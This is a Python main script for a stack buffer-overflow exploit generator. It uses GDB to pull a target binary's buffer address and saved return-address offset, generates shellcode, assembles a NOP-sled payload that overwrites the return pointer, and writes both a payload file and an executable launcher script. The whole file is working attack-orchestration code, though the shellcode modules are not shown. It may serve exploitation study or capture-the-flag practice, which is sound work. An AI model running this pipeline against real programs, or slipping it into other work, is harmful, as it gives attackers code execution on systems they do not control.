#!/usr/bin/env python3
"""Main entry point for the BOF exploit generator."""

import sys
import os
import logging
import shutil
import subprocess
from pathlib import Path

# Ensure the project root is in sys.path to allow imports from modules
sys.path.insert(0, str(Path(__file__).parent))

from modules.get_data import get_data
from modules.generate_shellcode import generate_shellcode, generate_shellcode_asm
from modules.generate_payload import generate_payload
from modules.refine_address import refine_address
from modules.generate_exploit import generate_exploit
from modules.test_shellcode import build_test_shellcode

from cli import get_parsed_args
from modules.config import (
    REQUIRED_TOOLS,
    WORD_SIZE,
    PAYLOAD_FILE_NAME,
    EXPLOIT_FILE_NAME
)

def setup_logging(verbose: bool) -> logging.Logger:
    """Configure logging based on verbosity level."""
    log = logging.getLogger("bof_exploit")
    
    # Remove any existing handlers
    log.handlers.clear()
    
    # Create handler that writes to stderr
    handler = logging.StreamHandler(sys.stderr)
    
    # Set format based on verbosity
    if verbose:
        log.setLevel(logging.DEBUG)
        handler.setLevel(logging.DEBUG)
        formatter = logging.Formatter("[%(levelname)s] %(message)s")
    else:
        log.setLevel(logging.INFO)
        handler.setLevel(logging.INFO)
        formatter = logging.Formatter("%(message)s")
    
    handler.setFormatter(formatter)
    log.addHandler(handler)
    
    return log

def main():
    """Orchestrate the whole exploit generation process."""
    # 1. Parse command line arguments
    args = get_parsed_args()
    binary = args["binary"]
    shellcode_type = args["shellcode"]
    data = args["data"]
    output_dir = args["output_dir"]
    verbose = args["verbose"]
    test_mode = args["test_shellcode"]

    # 2. Setup logging
    log = setup_logging(verbose)

    # 3. Do some checks
    # 3.1. Check required tools
    missing_tools = [tool for tool in REQUIRED_TOOLS if shutil.which(tool) is None]
    if missing_tools:
        log.error(f"Required tools not found: {", ".join(missing_tools)}. Please install it.")
        sys.exit(1)

    # 3.2. Check the binary (unless in test mode, where binary is not used)
    if not test_mode:
        if not binary.exists():
            log.error(f"Binary {binary} does not exist")
            sys.exit(1)
        if not os.access(binary, os.X_OK):
            log.error(f"Binary {binary} is not executable")
            sys.exit(1)

    # 4. Create output directory if it doesn"t exist
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        log.debug(f"Output directory: {output_dir}")
    except Exception as e:
        log.error(f"Cannot create output directory {output_dir}: {e}")
        sys.exit(1)

    # Log arguments at debug level
    log.debug(f"Binary: {binary}")
    log.debug(f"Shellcode type: {shellcode_type}")
    log.debug(f"Data: {repr(data)}")
    log.debug(f"Output directory: {output_dir}")
    log.debug(f"Test shellcode mode: {test_mode}")

    # 5. Generate shellcode
    log.debug(f"Generating {shellcode_type} shellcode...")
    try:
        shellcode = generate_shellcode(shellcode_type, data)
    except Exception as e:
        log.error(f"Shellcode generation failed: {e}")
        sys.exit(1)

    log.debug(f"Shellcode length: {len(shellcode)} bytes")

    # 6. If test mode, build standalone executable and exit
    if test_mode:
        bin_path = build_test_shellcode(shellcode_type, data, output_dir, verbose)
        if bin_path is None:
            sys.exit(1)
        print(f"[+] Test shellcode binary created: {bin_path}")
        return

    # 7. Normal exploit generation path
    # 7.1. Get information from the binary using GDB
    log.debug("Extracting data via GDB...")
    try:
        info = get_data(binary)
    except Exception as e:
        log.error(f"Failed to extract data from binary: {e}")
        sys.exit(1)

    buffer_addr = info["buffer_addr"]
    saved_rip_offset = info["saved_rip_offset"]
    log.debug(f"Buffer address: 0x{buffer_addr:x}")
    log.debug(f"Saved RIP offset: {saved_rip_offset} bytes")

    # Check if shellcode fits and warn about small NOP sled
    filler_size = saved_rip_offset - len(shellcode)
    if filler_size < 0:
        log.error(
            f"Shellcode length ({len(shellcode)}) exceeds available offset space "
            f"({saved_rip_offset} bytes). Cannot build payload."
        )
        sys.exit(1)
    if filler_size <= WORD_SIZE:
        log.warning(
            f"Only {filler_size} bytes of NOP sled available. "
            f"Payload may be unstable."
        )

    # 7.2. Build payload
    log.debug("Building payload...")
    try:
        # generate_payload returns bytes
        payload = generate_payload(buffer_addr, saved_rip_offset, shellcode)
    except Exception as e:
        log.error(f"Payload generation failed: {e}")
        sys.exit(1)

    refined_addr = refine_address(binary, payload)
    if refined_addr is not None:
        payload = generate_payload(refined_addr, saved_rip_offset, shellcode)

    # 7.3. Write payload to file
    payload_path = output_dir / PAYLOAD_FILE_NAME
    log.debug(f"Writing payload to {payload_path}...")
    try:
        payload_path.write_bytes(payload)
    except Exception as e:
        log.error(f"Failed to write payload file: {e}")
        sys.exit(1)

    # Always print success message to stdout (not via logger)
    print(f"[+] Payload successfully written to {payload_path}")

    # 7.4. Generate exploit launcher script content
    log.debug("Generating exploit launcher script content...")
    try:
        exploit_content = generate_exploit(binary, payload_path)
    except Exception as e:
        log.error(f"Exploit launcher generation failed: {e}")
        log.info("[!] Exploit script not created; you may need to run the program with the payload manually.")
        return  # Exit early, exploit not created

    # 7.5. Write exploit script to file
    exploit_path = output_dir / EXPLOIT_FILE_NAME
    log.debug(f"Writing exploit launcher to {exploit_path}...")
    try:
        exploit_path.write_text(exploit_content)
    except Exception as e:
        log.error(f"Failed to write exploit script: {e}")
        log.info("[!] Exploit script not created; you may need to run the program with the payload manually.")
        return

    # 7.6. Make the script executable (optional)
    try:
        exploit_path.chmod(0o755)
        log.debug(f"Made {exploit_path} executable")
    except Exception as e:
        log.warning(f"Could not make exploit script executable: {e}")
        log.info("[!] You may need to manually run: chmod +x " + str(exploit_path))

    # Print success message to stdout
    print(f"[+] Exploit launcher created: {exploit_path}")


if __name__ == "__main__":
    main()
